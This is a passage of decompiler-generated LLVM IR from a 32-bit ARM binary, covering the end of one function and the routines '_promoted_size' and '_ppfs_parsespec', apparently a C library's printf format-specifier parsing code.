  %v1_10a64 = inttoptr i32 %v0_10a64 to i32*
  %v2_10a64 = load i32, i32* %v1_10a64, align 4
  store i32 %v2_10a64, i32* %r3.global-to-local, align 4
  %v1_10a68 = load i32, i32* %ip.global-to-local, align 4
  %v2_10a68 = inttoptr i32 %v1_10a68 to i32*
  store i32 %v2_10a64, i32* %v2_10a68, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a44, %dec_label_pc_10a30, %dec_label_pc_10a1c, %dec_label_pc_10a5c
  %v0_10a6c = load i32, i32* %ip.global-to-local, align 4
  %v1_10a6c = add i32 %v0_10a6c, 8
  store i32 %v1_10a6c, i32* %ip.global-to-local, align 4
  %v0_10a70.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10a74.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_109ac, %dec_label_pc_10a6c
  %v0_10a74 = phi i32 [ %v0_10a7425, %dec_label_pc_109ac ], [ %v0_10a74.pre, %dec_label_pc_10a6c ]
  %v0_10a70 = phi i32 [ %v1_109ac24, %dec_label_pc_109ac ], [ %v0_10a70.pre, %dec_label_pc_10a6c ]
  %v1_10a70 = add i32 %v0_10a70, 1
  store i32 %v1_10a70, i32* %lr.global-to-local, align 4
  %v1_10a74 = add i32 %v0_10a74, 28
  %v2_10a74 = inttoptr i32 %v1_10a74 to i32*
  %v3_10a74 = load i32, i32* %v2_10a74, align 4
  store i32 %v3_10a74, i32* %r3.global-to-local, align 4
  %v5_10a7c = icmp slt i32 %v1_10a70, %v3_10a74
  br i1 %v5_10a7c, label %dec_label_pc_109ac, label %dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge

dec_label_pc_10a84:                               ; preds = %entry
  br i1 %v6_10960, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10a84
  %v2_10a88 = add i32 %v0_10948, 36
  %v3_10a88 = inttoptr i32 %v2_10a88 to i8*
  %v4_10a88 = load i8, i8* %v3_10a88, align 1
  %v5_10a88 = zext i8 %v4_10a88 to i32
  %v5_10a8c = mul nuw nsw i32 %v5_10a88, 8
  %v6_10a8c = add i32 %v5_10a8c, %v1_10954
  store i32 %v6_10a8c, i32* %r3.global-to-local, align 4
  %v2_10a90 = add i32 %v6_10a8c, -8
  %v3_10a90 = inttoptr i32 %v2_10a90 to i32*
  %v4_10a90 = load i32, i32* %v3_10a90, align 4
  store i32 %v4_10a90, i32* %r3.global-to-local, align 4
  store i32 %v4_10a90, i32* %v2_10958, align 4
  %v0_10a98.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10a84, %bb
  %v2_10aac = phi i32 [ %v0_10a98.pre, %bb ], [ %v0_10948, %dec_label_pc_10a84 ]
  %v1_10a98 = add i32 %v2_10aac, 4
  %v2_10a98 = inttoptr i32 %v1_10a98 to i32*
  %v3_10a98 = load i32, i32* %v2_10a98, align 4
  store i32 %v3_10a98, i32* %r3.global-to-local, align 4
  %v6_10a9c = icmp eq i32 %v3_10a98, -2147483648
  br i1 %v6_10a9c, label %bb15, label %dec_label_pc_10a80

bb15:                                             ; preds = %.thread2
  %v2_10aa0 = add i32 %v2_10aac, 37
  %v3_10aa0 = inttoptr i32 %v2_10aa0 to i8*
  %v4_10aa0 = load i8, i8* %v3_10aa0, align 1
  %v5_10aa0 = zext i8 %v4_10aa0 to i32
  %v1_10aa4 = load i32, i32* %ip.global-to-local, align 4
  %v5_10aa4 = mul nuw nsw i32 %v5_10aa0, 8
  %v6_10aa4 = add i32 %v5_10aa4, %v1_10aa4
  store i32 %v6_10aa4, i32* %r3.global-to-local, align 4
  %v2_10aa8 = add i32 %v6_10aa4, -8
  %v3_10aa8 = inttoptr i32 %v2_10aa8 to i32*
  %v4_10aa8 = load i32, i32* %v3_10aa8, align 4
  store i32 %v4_10aa8, i32* %r3.global-to-local, align 4
  store i32 %v4_10aa8, i32* %v2_10a98, align 4
  %v0_10ab0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10a80

dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge: ; preds = %dec_label_pc_10a70
  br label %dec_label_pc_10a80.loopexit

dec_label_pc_10a80.loopexit:                      ; preds = %dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge, %dec_label_pc_109a4
  %v0_10a74.lcssa = phi i32 [ %v0_10a74, %dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge ], [ %v0_10a7418, %dec_label_pc_109a4 ]
  br label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a80.loopexit, %.thread2, %bb15
  %v1_10ad0 = phi i32 [ %v0_10a74.lcssa, %dec_label_pc_10a80.loopexit ], [ %v2_10aac, %.thread2 ], [ %v0_10ab0.pre, %bb15 ]
  %v1_10ab0 = add i32 %v1_10ad0, 8
  %v2_10ab0 = inttoptr i32 %v1_10ab0 to i32*
  %v3_10ab0 = load i32, i32* %v2_10ab0, align 4
  store i32 %v3_10ab0, i32* %r1.global-to-local, align 4
  %v1_10ab4 = icmp slt i32 %v3_10ab0, 0
  br i1 %v1_10ab4, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_10a80
  %v5_10ab8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_10ab8, i32* @r4, align 4
  ret i32 %v1_10ad0

bb17:                                             ; preds = %dec_label_pc_10a80
  %v1_10abc = add i32 %v1_10ad0, 16
  %v2_10abc = inttoptr i32 %v1_10abc to i32*
  %v3_10abc = load i32, i32* %v2_10abc, align 4
  %v1_10ac4 = sub i32 0, %v3_10ab0
  store i32 %v1_10ac4, i32* %r1.global-to-local, align 4
  %v1_10ac0 = and i32 %v3_10abc, -10
  %v1_10ac8 = or i32 %v1_10ac0, 8
  store i32 %v1_10ac8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_10ad0 = add i32 %v1_10ad0, 20
  %v3_10ad0 = inttoptr i32 %v2_10ad0 to i32*
  store i32 32, i32* %v3_10ad0, align 4
  %v0_10ad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10ad4 = load i32, i32* @r0, align 4
  %v2_10ad4 = add i32 %v1_10ad4, 8
  %v3_10ad4 = inttoptr i32 %v2_10ad4 to i32*
  store i32 %v0_10ad4, i32* %v3_10ad4, align 4
  %v0_10ad8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10ad8 = load i32, i32* @r0, align 4
  %v2_10ad8 = add i32 %v1_10ad8, 16
  %v3_10ad8 = inttoptr i32 %v2_10ad8 to i32*
  store i32 %v0_10ad8, i32* %v3_10ad8, align 4
  %v2_10adc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10adc, i32* @r4, align 4
  %v8_10adc = load i32, i32* @r0, align 4
  ret i32 %v8_10adc

; uselistorder directives
  uselistorder i32 %v1_10a70, { 2, 1, 0 }
  uselistorder i32 %v0_10a74, { 1, 2, 0 }
  uselistorder i32 %v3_10a44, { 0, 2, 1, 3 }
  uselistorder i32 %v3_109bc, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_109bc, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_109b0, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_109ac24, { 1, 0 }
  uselistorder i32 %v0_10a7418, { 2, 0, 1 }
  uselistorder i32 %v0_10948, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_10a80, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_10a70, { 1, 0 }
  uselistorder label %dec_label_pc_10a6c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10a5c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10a44, { 1, 0 }
  uselistorder label %dec_label_pc_10a30, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_109ac, { 1, 0 }
  uselistorder label %dec_label_pc_109a4, { 1, 0 }
  uselistorder label %dec_label_pc_10980, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_10afc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10ae8

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10b04, %entry
  %v0_10ae8 = phi i32 [ %v1_10ae8, %dec_label_pc_10b04 ], [ ptrtoint (i32* @global_var_19390.356 to i32), %entry ]
  %v1_10ae8 = add i32 %v0_10ae8, -2
  %v1_10aec = add i32 %v0_10ae8, -1
  %v2_10aec = inttoptr i32 %v1_10aec to i8*
  %v3_10aec = load i8, i8* %v2_10aec, align 1
  %v4_10aec = zext i8 %v3_10aec to i32
  %v1_10af0 = inttoptr i32 %v1_10ae8 to i8*
  %v2_10af0 = load i8, i8* %v1_10af0, align 2
  %v3_10af0 = zext i8 %v2_10af0 to i32
  %v3_10af4 = mul nuw i32 %v4_10aec, 16777216
  %v4_10af8 = sdiv i32 %v3_10af4, 65536
  %v5_10af8 = or i32 %v4_10af8, %v3_10af0
  %v9_10afc = icmp eq i32 %v5_10af8, %v1_10afc.pre
  br i1 %v9_10afc, label %dec_label_pc_10ae8.dec_label_pc_10b10_crit_edge, label %dec_label_pc_10b04

dec_label_pc_10ae8.dec_label_pc_10b10_crit_edge:  ; preds = %dec_label_pc_10ae8
  br label %dec_label_pc_10b10

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10ae8
  %tmp = icmp ugt i32 %v1_10ae8, ptrtoint (i32* @global_var_19378.358 to i32)
  br i1 %tmp, label %dec_label_pc_10ae8, label %dec_label_pc_10b10

dec_label_pc_10b10:                               ; preds = %dec_label_pc_10b04, %dec_label_pc_10ae8.dec_label_pc_10b10_crit_edge
  %v2_10b18.pre-phi = sub i32 %v1_10ae8, ptrtoint (i32* @global_var_19378.358 to i32)
  store i32 ptrtoint (i32* @global_var_19390.356 to i32), i32* @r2, align 4
  %v4_10b1c = sdiv i32 %v2_10b18.pre-phi, 2
  %v5_10b1c = add i32 %v4_10b1c, ptrtoint (i32* @global_var_19390.356 to i32)
  %v6_10b1c = inttoptr i32 %v5_10b1c to i8*
  %v7_10b1c = load i8, i8* %v6_10b1c, align 1
  %v9_10b1c = zext i8 %v7_10b1c to i32
  ret i32 %v9_10b1c

; uselistorder directives
  uselistorder i32 %v1_10ae8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10ae8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19390.356 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10b30 = load i32, i32* @r4, align 4
  store i32 %v3_10b30, i32* %stack_var_-32, align 4
  %v6_10b30 = load i32, i32* @r5, align 4
  %v25_10b30 = ptrtoint i32* %stack_var_-32 to i32
  %v1_10b34 = add i32 %tmp, 16
  %v2_10b34 = inttoptr i32 %v1_10b34 to i32*
  %v3_10b34 = load i32, i32* %v2_10b34, align 4
  %v2_10b38 = ptrtoint i32* %stack_var_-88 to i32
  %v1_10b3c = and i32 %v3_10b34, 128
  store i32 %v1_10b3c, i32* @r4, align 4
  %v2_10b3c = icmp eq i32 %v1_10b3c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_10b5c = add i32 %tmp, 24
  %v2_10b5c = inttoptr i32 %v1_10b5c to i32*
  %v3_10b5c = load i32, i32* %v2_10b5c, align 4
  store i32 %v3_10b5c, i32* %sb.global-to-local, align 4
  br i1 %v2_10b3c, label %bb, label %dec_label_pc_10b7c

bb:                                               ; preds = %entry
  %v3_10b60 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_10bc8

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10d4c
  %v0_10b6c = load i32, i32* %r0.global-to-local, align 4
  %v0_10d7c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10d74

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10d78
  %v1_10b74 = add i32 %v0_10d7c.pre, 1
  store i32 %v1_10b74, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10d94

dec_label_pc_10b7c:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge, %dec_label_pc_10b7c
  %v1_10b90 = phi i32 [ %v1_10ba4, %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge ], [ 0, %dec_label_pc_10b7c ]
  %v0_10b80 = phi i32 [ %v0_10b80.pre, %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge ], [ %tmp, %dec_label_pc_10b7c ]
  %v1_10b80 = inttoptr i32 %v0_10b80 to i32*
  %v2_10b80 = load i32, i32* %v1_10b80, align 4
  %v4_10b84 = mul i32 %v1_10b90, 4
  %v5_10b84 = add i32 %v2_10b80, %v4_10b84
  store i32 %v5_10b84, i32* %r3.global-to-local, align 4
  %v1_10b88 = add i32 %v5_10b84, -4
  %v2_10b88 = inttoptr i32 %v1_10b88 to i32*
  %v3_10b88 = load i32, i32* %v2_10b88, align 4
  store i32 %v3_10b88, i32* %r1.global-to-local, align 4
  store i32 %v25_10b30, i32* @ip, align 4
  %v2_10b90 = add i32 %v1_10b90, %v25_10b30
  store i32 %v2_10b90, i32* %r2.global-to-local, align 4
  %v1_10b94 = trunc i32 %v3_10b88 to i8
  %v3_10b94 = add i32 %v2_10b90, -56
  %v4_10b94 = inttoptr i32 %v3_10b94 to i8*
  store i8 %v1_10b94, i8* %v4_10b94, align 1
  %v0_10b98 = load i32, i32* %r2.global-to-local, align 4
  %v1_10b98 = add i32 %v0_10b98, -56
  %v2_10b98 = inttoptr i32 %v1_10b98 to i8*
  %v3_10b98 = load i8, i8* %v2_10b98, align 1
  %v4_10b98 = zext i8 %v3_10b98 to i32
  store i32 %v4_10b98, i32* %r2.global-to-local, align 4
  %v0_10b9c = load i32, i32* %r3.global-to-local, align 4
  %v1_10b9c = add i32 %v0_10b9c, -4
  %v2_10b9c = inttoptr i32 %v1_10b9c to i32*
  %v3_10b9c = load i32, i32* %v2_10b9c, align 4
  store i32 %v3_10b9c, i32* %r3.global-to-local, align 4
  %v9_10ba0 = icmp eq i32 %v4_10b98, %v3_10b9c
  %v0_10ba4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10ba4 = add i32 %v0_10ba4, 1
  store i32 %v1_10ba4, i32* %r0.global-to-local, align 4
  br i1 %v9_10ba0, label %dec_label_pc_10bac, label %dec_label_pc_10fc4

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10b80
  %v2_10bac = icmp eq i8 %v3_10b98, 0
  br i1 %v2_10bac, label %dec_label_pc_10bbc, label %dec_label_pc_10bb4

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10bac
  %tmp166 = icmp ult i32 %v1_10ba4, 32
  br i1 %tmp166, label %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge, label %dec_label_pc_10bbc

dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge:  ; preds = %dec_label_pc_10bb4
  %v0_10b80.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10b80

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bb4, %dec_label_pc_10bac
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10bc4 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_10bc8

dec_label_pc_10bc8:                               ; preds = %bb, %dec_label_pc_10bbc
  %storemerge102 = phi i32 [ %v2_10bc4, %dec_label_pc_10bbc ], [ %v3_10b60, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_10bd8

dec_label_pc_10bd4:                               ; preds = %.thread22, %dec_label_pc_10ce4
  %v0_10bd4 = phi i32 [ %v2_10d5c, %.thread22 ], [ %storemerge105, %dec_label_pc_10ce4 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_10ce4 ]
  store i32 %v0_10bd4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10bd8

dec_label_pc_10bd8:                               ; preds = %dec_label_pc_10bc8, %dec_label_pc_10bd4
  %v1_10bf4 = phi i32 [ %storemerge102, %dec_label_pc_10bc8 ], [ %v0_10bd4, %dec_label_pc_10bd4 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_10bc8 ], [ %stack_var_-48.0, %dec_label_pc_10bd4 ]
  %v1_10bd8 = inttoptr i32 %v1_10bf4 to i8*
  %v2_10bd8 = load i8, i8* %v1_10bd8, align 1
  %v3_10bd8 = zext i8 %v2_10bd8 to i32
  store i32 %v3_10bd8, i32* %r3.global-to-local, align 4
  %v7_10bdc = icmp eq i8 %v2_10bd8, 42
  br i1 %v7_10bdc, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_10bd8
  store i32 %v1_10bf4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_10bd8
  %v1_10be8 = load i32, i32* @lr, align 4
  %v4_10be8 = mul i32 %v1_10be8, -4
  %v5_10be8 = add i32 %v4_10be8, %v25_10b30
  store i32 %v5_10be8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10bf4 = add i32 %v1_10bf4, 1
  store i32 %v2_10bf4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10bfc = add i32 %v5_10be8, -12
  %v4_10bfc = inttoptr i32 %v3_10bfc to i32*
  store i32 0, i32* %v4_10bfc, align 4
  %v0_10c20.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_10c20.pre = phi i32 [ %v0_10c20.pre.pre, %bb124 ], [ %v1_10bf4, %.thread9.thread ]
  %v2_10c24.pre = load i32, i32* @global_var_224e8, align 4
  br label %.backedge

dec_label_pc_10c04:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_10c08 = load i32, i32* %r0.global-to-local, align 4
  %v7_10c0c = icmp sgt i32 %v0_10c08, 4094
  br i1 %v7_10c0c, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_10c04
  %v1_10c1414 = add i32 %v0_10c98, 1
  store i32 %v1_10c1414, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_10c04
  %v11_10c10 = mul i32 %v0_10c08, 10
  %v12_10c10 = add i32 %v11_10c10, %v3_10c20
  store i32 %v12_10c10, i32* %r3.global-to-local, align 4
  %v1_10c14 = add i32 %v0_10c98, 1
  store i32 %v1_10c14, i32* %r6.global-to-local, align 4
  %v9_10c18 = add i32 %v12_10c10, -48
  store i32 %v9_10c18, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_10c98 = phi i32 [ %v0_10c20.pre, %.preheader ], [ %v1_10c14, %bb126 ], [ %v1_10c1414, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_224e8 to i32), i32* %r3.global-to-local, align 4
  %v1_10c20 = inttoptr i32 %v0_10c98 to i8*
  %v2_10c20 = load i8, i8* %v1_10c20, align 1
  %v3_10c20 = zext i8 %v2_10c20 to i32
  store i32 %v3_10c20, i32* %r2.global-to-local, align 4
  store i32 %v2_10c24.pre, i32* %r3.global-to-local, align 4
  %v3_10c28 = mul nuw nsw i32 %v3_10c20, 2
  %v4_10c28 = add i32 %v3_10c28, %v2_10c24.pre
  %v5_10c28 = inttoptr i32 %v4_10c28 to i8*
  %v6_10c28 = load i8, i8* %v5_10c28, align 1
  %v8_10c28 = zext i8 %v6_10c28 to i32
  store i32 %v8_10c28, i32* %r3.global-to-local, align 4
  %v1_10c2c = and i32 %v8_10c28, 8
  %v2_10c2c = icmp eq i32 %v1_10c2c, 0
  br i1 %v2_10c2c, label %dec_label_pc_10c34, label %dec_label_pc_10c04

dec_label_pc_10c34:                               ; preds = %.backedge
  %v0_10c34 = load i32, i32* %r1.global-to-local, align 4
  %v1_10c34 = add i32 %v0_10c34, -1
  %v2_10c34 = inttoptr i32 %v1_10c34 to i8*
  %v3_10c34 = load i8, i8* %v2_10c34, align 1
  %v4_10c34 = zext i8 %v3_10c34 to i32
  store i32 %v4_10c34, i32* %r3.global-to-local, align 4
  %v7_10c38 = icmp eq i8 %v3_10c34, 37
  br i1 %v7_10c38, label %dec_label_pc_10c40, label %dec_label_pc_10cfc

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c34
  %v7_10c40 = icmp eq i8 %v2_10c20, 36
  %. = zext i1 %v7_10c40 to i32
  store i32 %., i32* @ip, align 4
  %v0_10c4c = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_10c4c, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_10c40
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10c40, %bb130
  %v1_10ca8 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_10c40 ]
  %v2_10c54 = icmp eq i32 %v1_10ca8, 0
  %v0_10c84 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_10c54, label %dec_label_pc_10c84, label %dec_label_pc_10c5c

dec_label_pc_10c5c:                               ; preds = %thread-pre-split
  %v2_10c84 = icmp eq i32 %v0_10c84, 0
  %v1_10c60 = add i32 %v0_10c98, 1
  store i32 %v1_10c60, i32* %r1.global-to-local, align 4
  br i1 %v2_10c84, label %dec_label_pc_10fc4, label %dec_label_pc_10c68

dec_label_pc_10c68:                               ; preds = %dec_label_pc_10c5c
  %v2_10c68 = sub i32 %v0_10c4c, %v0_10c84
  %v4_10c68 = xor i32 %v0_10c84, %v0_10c4c
  %v5_10c68 = xor i32 %v2_10c68, %v0_10c4c
  %v6_10c68 = and i32 %v5_10c68, %v4_10c68
  %v7_10c68 = icmp slt i32 %v6_10c68, 0
  %v8_10c68 = icmp slt i32 %v2_10c68, 0
  %v9_10c68 = icmp eq i32 %v0_10c4c, %v0_10c84
  %v3_10c6c = xor i1 %v8_10c68, %v7_10c68
  %v4_10c6c = or i1 %v9_10c68, %v3_10c6c
  br i1 %v4_10c6c, label %dec_label_pc_10c7c, label %bb131

bb131:                                            ; preds = %dec_label_pc_10c68
  store i32 %v0_10c4c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10c7c

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10ca0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10c7c

dec_label_pc_10c7c:                               ; preds = %bb131, %dec_label_pc_10c68, %dec_label_pc_10c78
  %v0_10c7c = phi i32 [ %v0_10c34, %dec_label_pc_10c78 ], [ %v1_10c60, %dec_label_pc_10c68 ], [ %v1_10c60, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_10c78 ], [ %v0_10c4c, %dec_label_pc_10c68 ], [ %v0_10c4c, %bb131 ]
  br label %dec_label_pc_10cb4

dec_label_pc_10c84:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_10c84, 1
  br i1 %tmp132, label %dec_label_pc_10c98, label %dec_label_pc_10c8c

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_10c84
  %v7_10c8c = icmp eq i8 %v2_10c20, 109
  br i1 %v7_10c8c, label %dec_label_pc_10cfc, label %dec_label_pc_10fc4

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c84
  %tmp167 = icmp ugt i32 %v0_10c98, %v0_10c34
  br i1 %tmp167, label %dec_label_pc_10ca0, label %dec_label_pc_10c78

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10c98
  %v1_10ca0 = inttoptr i32 %v0_10c34 to i8*
  %v2_10ca0 = load i8, i8* %v1_10ca0, align 1
  %v3_10ca0 = zext i8 %v2_10ca0 to i32
  store i32 %v3_10ca0, i32* %r3.global-to-local, align 4
  %v7_10ca4 = icmp eq i8 %v2_10ca0, 48
  br i1 %v7_10ca4, label %dec_label_pc_10c78, label %bb133

bb133:                                            ; preds = %dec_label_pc_10ca0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10cfc

dec_label_pc_10cb4.loopexit:                      ; preds = %dec_label_pc_10cbc
  %v1_10cc8 = load i32, i32* @r4, align 4
  %v3_10cc8 = or i32 %v1_10cc8, %v0_10cdc
  store i32 %v3_10cc8, i32* @r4, align 4
  %v2_10ccc = add i32 %storemerge105, 1
  br label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10cb4.loopexit, %dec_label_pc_10c7c
  %storemerge105 = phi i32 [ %v0_10c7c, %dec_label_pc_10c7c ], [ %v2_10ccc, %dec_label_pc_10cb4.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19370.363 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10cc0 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10cb4
  %v0_10cdc = phi i32 [ %v2_10cdc, %dec_label_pc_10cd4 ], [ 1, %dec_label_pc_10cb4 ]
  %v0_10cbc = phi i32 [ %v5_10cbc, %dec_label_pc_10cd4 ], [ ptrtoint ([8 x i8]* @global_var_19370.363 to i32), %dec_label_pc_10cb4 ]
  %v1_10cbc = inttoptr i32 %v0_10cbc to i8*
  %v2_10cbc = load i8, i8* %v1_10cbc, align 1
  %v3_10cbc = zext i8 %v2_10cbc to i32
  store i32 %v3_10cbc, i32* %r2.global-to-local, align 4
  %v5_10cbc = add i32 %v0_10cbc, 1
  store i32 %v5_10cbc, i32* %r1.global-to-local, align 4
  %v2_10cc0 = load i8, i8* %v1_10cc0, align 1
  %v3_10cc0 = zext i8 %v2_10cc0 to i32
  store i32 %v3_10cc0, i32* %r3.global-to-local, align 4
  %v9_10cc4 = icmp eq i8 %v2_10cc0, %v2_10cbc
  br i1 %v9_10cc4, label %dec_label_pc_10cb4.loopexit, label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cbc
  %v1_10cd4 = inttoptr i32 %v5_10cbc to i8*
  %v2_10cd4 = load i8, i8* %v1_10cd4, align 1
  %v3_10cd4 = zext i8 %v2_10cd4 to i32
  store i32 %v3_10cd4, i32* %r3.global-to-local, align 4
  %v2_10cd8 = icmp eq i8 %v2_10cd4, 0
  %v2_10cdc = mul i32 %v0_10cdc, 2
  store i32 %v2_10cdc, i32* %r0.global-to-local, align 4
  br i1 %v2_10cd8, label %dec_label_pc_10ce4, label %dec_label_pc_10cbc

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cd4
  %v1_10ce4 = add i32 %storemerge105, -1
  %v2_10ce4 = inttoptr i32 %v1_10ce4 to i8*
  %v3_10ce4 = load i8, i8* %v2_10ce4, align 1
  %v7_10ce8 = icmp eq i8 %v3_10ce4, 37
  %v0_10cec = load i32, i32* @r4, align 4
  %v1_10cec = and i32 %v0_10cec, 10
  store i32 %v1_10cec, i32* %r3.global-to-local, align 4
  %v4_10cf0 = udiv i32 %v1_10cec, 2
  %v5_10cf0 = sub nuw nsw i32 -1, %v4_10cf0
  %v6_10cf0 = and i32 %v0_10cec, %v5_10cf0
  store i32 %v6_10cf0, i32* @r4, align 4
  br i1 %v7_10ce8, label %dec_label_pc_10cf8, label %dec_label_pc_10bd4

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10ce4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cfc

dec_label_pc_10cfc:                               ; preds = %bb133, %dec_label_pc_10c34, %dec_label_pc_10c8c, %dec_label_pc_10cf8
  %v1_10d40 = phi i32 [ %storemerge105, %dec_label_pc_10cf8 ], [ %v0_10c98, %bb133 ], [ %v0_10c98, %dec_label_pc_10c8c ], [ %v0_10c98, %dec_label_pc_10c34 ]
